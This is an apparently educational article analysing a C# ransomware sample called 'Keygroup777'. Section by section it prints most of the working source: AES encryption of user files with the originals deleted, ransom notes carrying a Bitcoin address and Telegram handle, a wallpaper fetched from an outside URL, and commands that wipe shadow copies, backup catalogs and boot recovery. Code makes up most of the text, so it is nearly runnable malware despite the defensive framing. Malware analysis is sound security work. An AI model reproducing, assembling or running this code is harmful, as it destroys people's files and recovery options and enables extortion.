# 🛡️ Dissecting a C# Ransomware: A Deep Dive into FileEncryption Code 🛡️

Ransomware is a malicious software that encrypts files on a victim's computer, demanding payment for decryption. The provided C# code is an example of such malware, specifically a ransomware variant named "Keygroup777." This article analyzes the code, breaking down its functionality, illustrating each component with the full source code, and highlighting its malicious behavior. The goal is to understand how it operates and raise awareness about such threats.

**Note**: This analysis is for educational purposes only. Do not execute or distribute this code, as it is harmful and illegal.

---

## 📜 Overview of the Ransomware

The `FileEncryption` class is a C# program that performs the following malicious actions:
1. Encrypts files with specific extensions in predefined directories using AES encryption.
2. Generates a random password for encryption, making decryption without the key difficult.
3. Places ransom notes (`keygroup.ini` and `Readm.txt`) across directories, demanding a Bitcoin payment.
4. Changes the desktop wallpaper to a custom image.
5. Deletes system backups and shadow copies to prevent file recovery.
6. Uses a hardcoded Bitcoin address and Telegram contact for ransom payment instructions.

Below, we analyze each key component with the corresponding code.

---

## 🔑 1. Targeting Files and Directories

### Functionality
The ransomware targets a wide range of file extensions (e.g., `.docx`, `.jpg`, `.pdf`) across multiple user directories, such as Desktop, Downloads, and OneDrive. It uses two arrays:
- `array`: Lists 262 file extensions to target.
- `array2`: Specifies 13 directories to scan for files.

### Code
```csharp
string[] array = new string[262]
{
	".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".lnk", ".url", ".txt", ".jar",
	".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
	// ... (additional extensions)
	".frm", ".mwb"
};
string[] array2 = new string[13]
{
	Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
	Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
	Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
	Environment.GetFolderPath(Environment.SpecialFolder.Personal),
	Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
	Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
	// ... (additional directories)
	Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
};
```

### Analysis
- **File Extensions**: The extensive list covers common document, image, video, and code files, maximizing the impact on the victim.
- **Directories**: By targeting user-specific folders, the ransomware ensures it encrypts personal and frequently accessed files.
- **Potential Weakness**: The hardcoded list of extensions and directories may miss less common file types or custom directories.

---

## 🔒 2. File Encryption with AES

### Functionality
The `EncryptFile` method encrypts files using the AES algorithm with a randomly generated password. It appends `.Keygroup777` to encrypted file names and deletes the original files.

### Code
```csharp
private static void EncryptFile(string inputFile, string password)
{
	try
	{
		byte[] key = GenerateKeyFromPassword(password);
		byte[] iV = GenerateIV();
		using (FileStream fileStream = new FileStream(inputFile, FileMode.Open))
		{
			string path = inputFile + ".Keygroup777";
			using FileStream stream = new FileStream(path, FileMode.Create);
			using Aes aes = Aes.Create();
			aes.Key = key;
			aes.IV = iV;
			using CryptoStream destination = new CryptoStream(stream, aes.CreateEncryptor(), CryptoStreamMode.Write);
			fileStream.CopyTo(destination);
		}
		File.Delete(inputFile);
	}
	catch (Exception)
	{
	}
}

private static byte[] GenerateKeyFromPassword(string password)
{
	Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }, 10000);
	return rfc2898DeriveBytes.GetBytes(32);
}

private static byte[] GenerateIV()
{
	byte[] array = new byte[16];
	Random random = new Random();
	random.NextBytes(array);
	return array;
}

private static string GenerateRandomPassword(int length)
{
	StringBuilder stringBuilder = new StringBuilder();
	Random random = new Random();
	for (int i = 0; i < length; i++)
	{
		stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
	}
	return stringBuilder.ToString();
}
```

### Analysis
- **AES Encryption**: The ransomware uses AES with a 256-bit key derived from a random 32-character password using PBKDF2 (`Rfc2898DeriveBytes`).
- **Initialization Vector (IV)**: A random 16-byte IV is generated for each file, ensuring unique encryption even with the same key.
- **File Deletion**: After encryption, the original file is deleted, leaving only the encrypted `.Keygroup777` version.
- **Weakness**: The random password is generated locally but not stored or sent, suggesting the decryption key may be hardcoded or managed externally (e.g., by the attacker).

---

## 📝 3. Ransom Notes

### Functionality
The ransomware creates ransom notes in two forms:
- `keygroup.ini` in targeted directories.
- `Readm.txt` in additional system directories via the `Zeus` method.

Both notes demand a $300 Bitcoin payment to a specific address and provide a Telegram contact (`@keygroup777Rezerv1`) and a decryption code (`e5Pc4P8WjF35`).

### Code
```csharp
// In Main method
string[] array6 = array2;
foreach (string path2 in array6)
{
	string path3 = Path.Combine(path2, "keygroup.ini");
	File.WriteAllText(path3, "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn .\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35");
}

// Zeus method
private static void Zeus()
{
	string[] array = new string[20]
	{
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "Readm.txt"),
		// ... (additional paths)
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Readm.txt")
	};
	string[] array2 = array;
	foreach (string path in array2)
	{
		try
		{
			if (File.Exists(path))
			{
				File.WriteAllText(path, "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn .\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35");
			}
			else
			{
				File.WriteAllText(path, "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn .\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35");
			}
		}
		catch (Exception)
		{
		}
	}
}
```

### Analysis
- **Ransom Demand**: The note claims the encryption is "military grade" and demands $300 in Bitcoin, a relatively low amount compared to other ransomware.
- **Bitcoin Address**: The hardcoded address (`bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn`) and Telegram handle suggest a centralized attacker.
- **Decryption Code**: The code `e5Pc4P8WjF35` may be a placeholder or unique per victim, but its purpose is unclear without server-side logic.
- **Weakness**: The repeated Bitcoin address makes it traceable, and the Telegram handle could be shut down, disrupting the attacker's operation.

---

## 🖼️ 4. Changing the Desktop Wallpaper

### Functionality
The `Foto` method downloads an image from a URL and sets it as the desktop wallpaper using the `SystemParametersInfo` Windows API.

### Code
```csharp
private static void Foto()
{
	string imageUrl = "https://i.postimg.cc/mBtdNrw4/wallpaper.jpg";
	ChangeWallpaper(imageUrl);
}

public static void ChangeWallpaper(string imageUrl)
{
	using WebClient webClient = new WebClient();
	string text = Environment.GetEnvironmentVariable("TEMP") + "\\wallpaper.jpg";
	webClient.DownloadFile(imageUrl, text);
	SystemParametersInfo(20, 0, text, 3);
}

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
```

### Analysis
- **Purpose**: Changing the wallpaper to a threatening image reinforces the ransom demand visually.
- **Implementation**: The image is downloaded to the TEMP directory and set using the `SystemParametersInfo` API with `SPI_SETDESKWALLPAPER` (20).
- **Weakness**: The hardcoded URL could be taken down, and the wallpaper change is reversible by the user.

---

## 🗑️ 5. Deleting Backups and Shadow Copies

### Functionality
The `Catu` method executes commands to delete Volume Shadow Copies, disable recovery options, and remove backup catalogs, preventing file restoration.

### Code
```csharp
public static void Catu()
{
	ExecuteCommand("vssadmin delete shadows /all /quiet");
	ExecuteCommand("wmic shadowcopy delete");
	ExecuteCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
	ExecuteCommand("bcdedit /set {default} recoveryenabled no");
	ExecuteCommand("wbadmin delete catalog -quiet");
}

private static void ExecuteCommand(string command)
{
	try
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.Arguments = "/c " + command;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		process.WaitForExit();
		if (process.ExitCode == 0)
		{
		}
	}
	catch (Exception)
	{
	}
}
```

### Analysis
- **Commands**:
  - `vssadmin delete shadows /all /quiet`: Deletes all shadow copies.
  - `wmic shadowcopy delete`: Alternative method to remove shadow copies.
  - `bcdedit /set {default} bootstatuspolicy ignoreallfailures`: Disables boot failure recovery.
  - `bcdedit /set {default} recoveryenabled no`: Disables system recovery.
  - `wbadmin delete catalog -quiet`: Deletes Windows Backup catalogs.
- **Purpose**: These actions ensure victims cannot restore files without paying the ransom.
- **Weakness**: These commands require administrative privileges, which the ransomware may not have, limiting its effectiveness.

---

## 🛠️ 6. Main Execution Flow

### Functionality
The `Main` method orchestrates the ransomware's actions:
1. Generates a random password.
2. Calls `Zeus`, `Foto`, and `Catu`.
3. Encrypts files in targeted directories.
4. Places `keygroup.ini` ransom notes.

### Code
```csharp
public static void Main(string[] args)
{
	string[] array = new string[262] { /* ... */ };
	string[] array2 = new string[13] { /* ... */ };
	string password = GenerateRandomPassword(32);
	Zeus();
	Foto();
	Catu();
	string[] array3 = array2;
	foreach (string path in array3)
	{
		string[] array4 = array;
		foreach (string text in array4)
		{
			string[] files = Directory.GetFiles(path, "*" + text);
			string[] array5 = files;
			foreach (string text2 in array5)
			{
				if (!text2.Contains("Мои видеозаписи"))
				{
					EncryptFile(text2, password);
				}
			}
		}
	}
	string[] array6 = array2;
	foreach (string path2 in array6)
	{
		string path3 = Path.Combine(path2, "keygroup.ini");
		File.WriteAllText(path3, "You became victim of the keygroup777 RANSOMWARE!\r\n...");
	}
}
```

### Analysis
- **Flow**: The ransomware systematically executes its components, ensuring encryption and ransom note placement.
- **Exception Handling**: Empty `catch` blocks ignore errors, making the ransomware resilient to failures (e.g., file access issues).
- **Weakness**: The hardcoded filter excluding files with "Мои видеозаписи" (Russian for "My Videos") suggests a specific target or oversight by the attacker.

---

## ⚠️ Ethical and Legal Considerations

This ransomware is illegal and harmful. Distributing or executing it violates laws in most jurisdictions, including the U.S. Computer Fraud and Abuse Act and EU cybercrime directives. If you encounter such malware:
- **Do not pay the ransom**: Payment encourages attackers and may not guarantee decryption.
- **Report to authorities**: Contact local law enforcement or cybercrime units.
- **Restore from backups**: Use offline backups to recover files.
- **Seek professional help**: Cybersecurity experts can assist in mitigation.

---

## 📚 Conclusion

The `FileEncryption` ransomware demonstrates a sophisticated yet flawed approach to malicious software. Its use of AES encryption, system command execution, and ransom notes makes it dangerous, but hardcoded elements (e.g., Bitcoin address, URL) and privilege requirements expose vulnerabilities. Understanding such code helps developers and security professionals build better defenses, such as robust backup systems and endpoint protection.

By analyzing this ransomware, we gain insights into attacker tactics and reinforce the importance of cybersecurity practices like regular backups, strong passwords, and system updates. Stay vigilant! 🛡️
